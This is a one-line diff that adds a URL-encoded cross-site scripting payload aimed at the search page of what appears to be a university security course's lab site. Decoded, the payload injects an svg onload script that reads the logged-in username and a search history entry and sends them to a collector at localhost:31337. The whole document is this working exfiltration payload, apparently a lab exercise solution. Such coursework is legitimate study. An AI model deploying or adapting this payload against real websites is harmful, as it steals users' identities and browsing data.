@@ -1,0 +1,1 @@
+https://project2.ecen4133.org/search?q=%3Csvg+onload%3D%22setTimeout%28function%28%29%7Buser%3D%24%28%27%23logged-in-user%27%29.text%28%29%3Blast_srch%3D%24%28%27%23history-list%27%29.children%28%29%5B1%5D.text%3B%24.get%28%27http%3A%2F%2Flocalhost%3A31337%2F%3Fstolen_user%3D%27+%2B+user+%2B+%27%26last_search%3D%27+%2B+last_srch%2C0%29%7D%2C+3000%29%22%3E
